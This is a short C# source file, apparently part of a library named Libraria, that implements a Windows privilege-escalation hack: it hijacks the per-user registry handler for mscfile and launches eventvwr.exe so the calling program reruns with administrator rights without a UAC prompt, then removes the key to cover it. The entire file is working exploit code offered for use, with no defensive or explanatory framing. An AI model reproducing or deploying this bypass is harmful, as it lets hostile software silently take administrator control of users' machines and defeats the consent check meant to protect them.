using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Reflection;
using Libraria.Security;

// Port of https://github.com/massivedynamic/zero2hero

namespace Libraria.Hacks {
	public static class PrivEsc {
		const string EscalateCommandLineArg = "--escalate";

		public static void ElevateFile(string FileName) {
			RegistryKey K = Registry.CurrentUser.CreateSubKey("Software\\Classes\\mscfile\\shell\\open\\command", true);
			K.SetValue("", FileName);

			string VwrPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "eventvwr.exe");
			Process.Start(VwrPath).WaitForExit();

			Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\mscfile");
		}

		public static bool Escalate(string[] Args) {
			if (Privileges.IsAdministrator()) {
				if (Args.Length == 1 && Args[0] == EscalateCommandLineArg) {
					Process.Start(Lib.GetProcessExePath());
					Environment.Exit(0);
				} else {
					return true;
				}
			} else {
				ElevateFile(string.Format("{0} {1}", Lib.GetProcessExePath(), EscalateCommandLineArg));
				Environment.Exit(0);
			}

			return false;
		}
	}
}